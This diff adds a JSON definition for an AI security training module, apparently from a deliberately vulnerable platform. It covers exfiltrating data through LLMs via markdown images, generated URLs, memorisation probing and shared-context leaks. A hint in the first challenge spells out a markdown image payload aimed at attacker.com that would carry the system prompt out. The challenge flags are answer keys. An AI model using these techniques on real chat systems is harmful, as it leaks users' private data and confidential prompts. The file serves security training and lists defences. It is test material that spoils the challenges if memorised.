@@ -1,0 +1,75 @@
+{
+  "slug": "data-exfiltration",
+  "name": "AI Data Exfiltration",
+  "description": "Exploit AI systems as data exfiltration channels. Demonstrate how LLMs can be weaponized to leak sensitive data through covert channels including markdown rendering, URL generation, model outputs, and side-channel inference from model behavior.",
+  "category": "data_exfiltration",
+  "difficulty": "intermediate",
+  "version": "1.0.0",
+  "author": "DVAP Research Team",
+  "sort_order": 11,
+  "objectives": [
+    "Exfiltrate user data through LLM-generated URLs",
+    "Use markdown image rendering as a covert exfiltration channel",
+    "Extract training data through memorization probing",
+    "Exploit model output to encode and exfiltrate context window contents",
+    "Demonstrate side-channel inference from model response timing"
+  ],
+  "tags": ["LLM02", "LLM06", "data-exfiltration", "covert-channel", "information-disclosure"],
+  "attack_surface": [
+    "LLM generating URLs or external references",
+    "Markdown rendering in chat interfaces",
+    "Model memorization of training data",
+    "Context window visible to model during generation",
+    "Response metadata observable by attacker"
+  ],
+  "mitigations": [
+    "Sanitize and block external URL generation",
+    "Content Security Policy restricting markdown rendering",
+    "Output scanning for PII and sensitive patterns",
+    "Context window access controls",
+    "Training data deduplication and memorization mitigation"
+  ],
+  "detection_opportunities": [
+    "Monitor outbound requests triggered by model outputs",
+    "Alert on PII patterns in model responses",
+    "Log and inspect URL generation events",
+    "Detect encoded data patterns in model output"
+  ],
+  "architecture": {
+    "components": ["Chat interface", "LLM", "Markdown renderer", "External request handler", "Context assembly"],
+    "data_flow": "User prompt -> Context assembly -> LLM generation -> Markdown render -> UI display",
+    "trust_boundaries": ["Model output is untrusted before display", "Markdown rendering is a code execution boundary"]
+  },
+  "threat_model": {
+    "threat_actors": ["Attacker with prompt access", "Malicious document contributor"],
+    "attack_vectors": ["URL-based exfiltration", "Markdown injection", "Memorization extraction"],
+    "impact": "PII disclosure, context window exfiltration, sensitive data leak",
+    "likelihood": "High in chat applications with markdown rendering and external network access"
+  },
+  "challenges": [
+    {
+      "slug": "markdown-exfil",
+      "name": "The Invisible Request",
+      "description": "Craft a prompt that causes the model to generate a markdown image that exfiltrates the system prompt to your server.",
+      "difficulty": "intermediate",
+      "points": 300,
+      "flag": "DVAP{m4rkd0wn_3xf1l_ch4nn3l}",
+      "hints": [
+        "![img](https://attacker.com/?data=...) triggers an HTTP request when rendered",
+        "Ask the model to include the system prompt as a URL parameter"
+      ]
+    },
+    {
+      "slug": "context-window-leak",
+      "name": "Window Shopping",
+      "description": "Extract the full contents of another user's conversation context that has been injected into a shared model session.",
+      "difficulty": "advanced",
+      "points": 400,
+      "flag": "DVAP{c0nt3xt_w1nd0w_l34k3d}",
+      "hints": [
+        "The shared session model maintains context from multiple users",
+        "Careful prompt construction can surface adjacent context"
+      ]
+    }
+  ]
+}
